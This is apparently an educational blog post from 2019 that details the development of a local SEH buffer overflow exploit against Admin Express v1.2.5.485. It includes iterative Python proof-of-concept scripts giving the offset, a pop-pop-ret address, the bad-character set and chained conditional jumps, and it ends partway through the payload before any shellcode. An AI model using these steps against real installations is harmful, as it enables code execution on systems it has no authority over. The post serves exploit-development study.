---
title:  "Exploit Development: 0day! Admin Express v1.2.5.485 Folder Path Local SEH Alphanumeric Encoded Buffer Overflow"
date:   2019-05-06
tags: [posts]
excerpt: "A 0day I found in an application called Admin Express, how to, by hand, alphanumerically encode shellcode, align the stack properly, and explaining the integral details of this exploit."
---
Introduction
---
Get an internship at a Fortune 500 company in information security...? check! Obtain the OSCP before I graduate college...? check! Discover a vulnerability and obtain code execution...? Oh, that is depressing. These are the first three goals I've set for myself, since I've had the inclination to obtain a career within information security. Reviewing the elusive last item on this checklist marred my confidence with every second that passed, and that did not sit well with me. After months of probing the [Exploit Database](https://www.exploit-db.com) for some Denial of Service vulnerabilities, I am very happy to report that I have taken a crash of an application and revitalized it to obtain code execution! 

This blog post ___WILL BE LENGTHY___, but I hope there is some good information you can take away about what I learned about the following domains: alphanumeric shellcode, encoding shellcode, aligning the stack, assembler, hexadecimal math, shellcode that directly references the kernel, and those famous SEH exploits. This writeup will assume you understand exception handler exploits. If you do not know much about those, or want a refresher, you can find my writeup [here](https://connormcgarr.github.io/Exception-Handlers-and-Egg-Hunters/). Let's get into it!

The Crash
---
While perusing about for some DOS exploits, I stumbled across [this](https://www.exploit-db.com/exploits/46711). Admin Express, which is an older application developed in 2005 and maintained until about 2008, crashes when a user supplies 5000 bytes unsuspecting to the application. Admin Express functions as a type of network analyzer and asset management program via network enumeration. Being that this is an older application, which has about 20,000 downloads, you may find it in some older networks like operational technology (OT) environments. Due to the sentiment above about 5000 bytes being needed to crash the application, I decided I was going to proceed with the exploit development lifecycle. This exploit can be completed on any Windows machine that does not default to using [ASLR and DEP](https://security.stackexchange.com/questions/18556/how-do-aslr-and-dep-work). [Bypassing ASLR and DEP](https://www.exploit-db.com/docs/english/17914-bypassing-aslrdep.pdf) is not within the scope of this post.

Let's Get This Party Started!
---
The vulnerability in this application arises from the __Folder Path__ field within the __System Compare__ configuration tab. [Open the application](https://admin-express.en.softonic.com/download), attach it to [Immunity Debugger](https://www.immunityinc.com/products/debugger/), and run it via Immunity.

Going forward, we will be utilizing this proof of concept (PoC) Python script that will aid us in the exploit development lifecycle. If you want to follow along, read the next couple of steps. If you are here for just the information, we are almost to the crash! Here is the script:

```console
root@kali:~/ADMIN_EXPRESS/POC# cat poc.py 
# Proof of Concept - Admin Express v1.2.5.485 Exploit

payload = "\x41" * 5000

print payload

#f = open('pwn.txt', 'w')
#f.write(payload)
#f.close()
```
A couple of notes about the above exploit. This script will generate 5000 `\x41` characters, or A's. Notice how at the bottom of the script, the last three lines are commented out. This is due to the fact that this exploit would get tedious opening up a file everytime. Until we have commenced with the full development of this exploit, we will leave these closed and print straight to the console.


Here are the next steps to get started:
1. After starting the application in Immunity, click on the __System Compare__  tab in Admin Express.
2. Run the above PoC script and copy the output to the clipboard.
3. Paste the contents into the left hand __Folder Path__ field, and press the __scale icon__ to the right of that same __Folder Path__ field

<img src="{{ site.url }}{{ site.baseurl }}/images/1.png" alt="">

The application now has crashes! Now on to some more in depth and intricate analysis of the crash.

After the crash, take a look at the registers. It seems at first glance we can control EBP, ESI, EDI, and EDX:

<img src="{{ site.url }}{{ site.baseurl }}/images/2.png" alt="">

Seeing as we cannot control the instruction pointer, the logical next choice would be to see if there was an exception caught. If we can overwrite the exception handlers, we can still potentially obtain code execution my maniipulating the exception handlers and passing the exceptions onto the stack! After viewing the registers in Immunity, we see we can control nSEH and SEH!

<img src="{{ site.url }}{{ site.baseurl }}/images/3.png" alt="">

As I have already explained in a [previous post](https://connormcgarr.github.io/Exception-Handlers-and-Egg-Hunters/) how the exception handler exploits work, I will omit the offset to the exception handlers. I want this post to be more about alphanumeric encoding, stack alignments, and getting creative. I can tell you that the amount of bytes needed to reach the handlers is `4260`

For those of you following along or are interested, your POC should be updated to this:

```console
root@kali:~/ADMIN_EXPRESS/POC# cat poc.py 
# Proof of Concept - Admin Express v1.2.5.485 Exploit

payload = "\x41" * 4260
payload += "\x42\x42\x42\x42" 		# nSEH
payload += "\x43\x43\x43\x43"		# SEH
payload += "\x41" * (5000-len(payload))	# The remaining bytes to create the crash

print payload

#f = open('pwn.txt', 'w')
#f.write(payload)
#f.close()
```

we can use the typical `pop <reg> pop <reg> ret` method to get our user supplied instructions onto the stack! We will need to use __mona__ to find an address in Admin Express that contains the instructions of `pop <reg> pop <reg> ret`. Here is the command in mona to use: 
`!mona seh`

<img src="{{ site.url }}{{ site.baseurl }}/images/4.png" alt="">

Better view of the addresses (open the above image in a new tab to see more clearly):

<img src="{{ site.url }}{{ site.baseurl }}/images/5a.png" alt="">

As you can see, there is a problem. All of the recommended memory addresses contain `00`, or null bytes. As we will find, these are not in our allowed character set. To get around this problem, read line that says:                                       `[+] Done.. Only the first 20 pointers are shown here, For more pointers, open seh.txt`. If you open __File Explorer__ and go to `C:\Program Files\Immunity Inc\Immunity Debugger\seh.txt` you can find a list of all instructions that are `pop <reg> pop <reg> ret`within seh.txt

You can go to seh.txt choose any of the memory locations that will work. You will find out shortly that we have some bad characters, and some of them may not work. There are a few in there that have no null bytes __AND__ adhere to the character schema. We will get to finding all of the bad characters in a second, just keep [Trying Harder](https://www.offensive-security.com/when-things-get-tough/) The address I chose was: `0x10014C42`.

Before updating the PoC, let's add a jump! The typical thing to do in a SEH exploit would be to do a short jump into the second buffer, where presumably our shellcode is. Remember to restart Immunity, and press play. Here is the updated PoC:
```console
root@kali:~/ADMIN_EXPRESS/POC# cat poc.py 
# Proof of Concept - Admin Express v1.2.5.485 Exploit

payload = "\x41" * 4260
payload += "\xeb\x06\x90\x90" 		# Short jump 6 bytes into C buffer
payload += "\x42\x4c\x01\x10"		# 0x10014c42 pop pop ret wmiwrap.DLL
payload += "\x43" * (5000-len(payload))	# The remaining bytes to create the crash. Changed to C's to differentiate
					# between 1st and last buffer.

print payload

#f = open('pwn.txt', 'w')
#f.write(payload)
#f.close()
```
Execute the Python script, copying the output, and pasting it back into the __Folder Path__ field, we see the application crashes again! Let us do some more analysis.

We see there is no change in the registers in terms of which we are writing too! Let's view the SEH chain to verify our `pop <reg> pop <reg> ret` is loaded properly:

<img src="{{ site.url }}{{ site.baseurl }}/images/6.png" alt="">

Set a breakpoint with `F2` and pass the exception with `Shift` `F9`:

<img src="{{ site.url }}{{ site.baseurl }}/images/7.png" alt="">

Step through with `F7`. We reach our nSEH jump instruction, but we notice something wrong! Our instructions got mangeled:

<img src="{{ site.url }}{{ site.baseurl }}/images/8.png" alt="">

Well, this is a problem. A short jump is the typical instruction for jumping we are used to. It is evidently a bad character. We now need to determine what all of the other bad characters are. [Here](https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/) is a place that automatically stores all of the characters possible into a variable. Here is the updated PoC:

```console
root@kali:~/ADMIN_EXPRESS/POC# cat poc.py 
# Proof of Concept - Admin Express v1.2.5.485 Exploit

badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = "\x41" * 4260
#payload += "\xeb\x06\x90\x90"          # Short jump 6 bytes into C buffer
payload += "\x42\x4c\x01\x10"           # 0x10014c42 pop pop ret wmiwrap.DLL
payload += badchars                     # Adding bad characters.
payload += "\x43" * (5000-len(payload))

print payload

#f = open('pwn.txt', 'w')
#f.write(payload)
#f.close()
```
You may have to break the bad characters up into two sections, but if you throw all of these you will figure out the bad characters. To save time, I will provide the character set. The allowed characters for this exploit are as follows (in hex):
`01-04, 06, 10-7E`. This will prove to provide some challenges going forward. But for now, just remember these characters are bad.

So there is a dilemma at this point. How can we jump to where our expected shellcode is going to be without our opcode `eb`? We are going to have to use a different type of instruction. The instruction we are going to use is `Jump If Overflow` and `Jump If Not OVerflow`, known as `JO` and `JNO`, respectively.

Look at the below screenshot. These are what are known as the flags. These flags can be used to test conditions, similar to how `if` statements have variables to test conditions in high level programming languages like C!

<img src="{{ site.url }}{{ site.baseurl }}/images/9.png" alt="">

Look in the above image at the `O` flag. This is the flag we will be using! `JO` (Jump Overflow) is an opcode that will perform the amount of bytes appended to the opcode __IF__ that flag is set to `1`, at the time of execution. A `JNO` (Jump If Not Overflow) will occur if the `O` flag is set to 0 at the time of execution.

The reason why we would want to use these opcodes is simple. They adhere to the character set we are limited to! The opcode for `JO` is `\x70` and the opcode for `JNO` is `\x71`. We can actually do something pretty clever here, too. Since these are conditional jumps, that means there must be some type of event or sentiment that must be present in order for the jump to happen. Instead of trying to manipulate the flags to meet the condition needed by the jump, you can stack the opcodes! Here is an example of this: 

If I input an opcode of `\x70\x06\x71\x06` this means my instruction will do a `JO` 6 bytes forward __THEN__ a `JNO` 6 bytes forward. But, if my first instruction gets executed, I can disregard the fact I ever had the second instruction. And if the first instruction does not execute, it will default to the second instruction! Before we update the PoC, I want to show something that happened on the stack after our `pop <reg> pop <reg> ret` instructions. There are a few null bytes that were thrown on to the stack as seen below:

<img src="{{ site.url }}{{ site.baseurl }}/images/10.png" alt="">

Due to this fact, we are going to do a lot of jumps away from these bytes. I am a person who likes to plan ahead, and knowing these bytes are there worries me a bit in terms of writing shellcode later. Since `7E` is our last allowed character, which is 126 in decimal. This means we are going to make a 126 byte jump forward. 

Since calculating a negative number in hex requires the two's compliment, this generally means the number will be outside our character range. Anyways, here is the updated PoC:

```console
root@kali:~/ADMIN_EXPRESS/POC# cat poc.py 
# Proof of Concept - Admin Express v1.2.5.485 Exploit


payload = "\x41" * 4260
payload += "\x70\x7e\x71\x7e" 		# JO 126 hex bytes. If jump fails, default to JNO 126 hex bytes
payload += "\x42\x4c\x01\x10"		# 0x10014c42 pop pop ret wmiwrap.DLL
payload += "\x43" * (5000-len(payload))

print payload

#f = open('pwn.txt', 'w')
#f.write(payload)
#f.close()
```

We repeat all of the same steps as above to crash the application, and we see below we have reached our jump:

<img src="{{ site.url }}{{ site.baseurl }}/images/11.png" alt="">

Awesome! The jump is ready to be taken! Our `O` flag is set to 0 at the current time of the instruction, so our jump will occur when the `JNO` operation is loaded into EIP for execution. We have a slight issue though. Look at the image below:

<img src="{{ site.url }}{{ site.baseurl }}/images/12.png" alt="">

We see there are some null bytes. These bytes are contained in our buffer of C's, not much farther down than our jump instruction. I am a paranoid person when it comes to having enough space for shellcode. Therefore,, I decided to change my PoC to add __a lot__ more jumps. This way, we get way the heck away from those null bytes and we will have plenty of room to write our shellcode.  Here is the updated PoC:

```console
root@kali:~/ADMIN_EXPRESS/POC# cat poc.py 
# Proof of Concept - Admin Express v1.2.5.485 Exploit

payload = "\x41" * 4260
payload += "\x70\x7e\x71\x7e"		# JO 126 bytes. If jump fails, default to JNO 126 bytes
payload += "\x42\x4c\x01\x10"		# 0x10014c42 pop pop ret wmiwrap.DLL

# There are 2 NULL (\x00) terminators in our buffer of A's, near our nSEH jump. We are going to jump far away from them
# so we have enough room for our shellcode and to decode.
payload += "\x41" * 122			# add padding since we jumped 7e hex bytes (126 bytes) above
payload += "\x70\x7e\x71\x7e"		# JO or JNO another 126 bytes, so shellcode can decode
payload += "\x41" * 124
payload += "\x70\x7e\x71\x7e"		# JO or JNO another 126 bytes, so shellcode can decode
payload += "\x41" * 124
payload += "\x70\x79\x71\x79"		# JO or JNO only 121 bytes
payload += "\x41" * 121			# NOP is in the restricted characters. Using \x41 as a slide into alignment
```
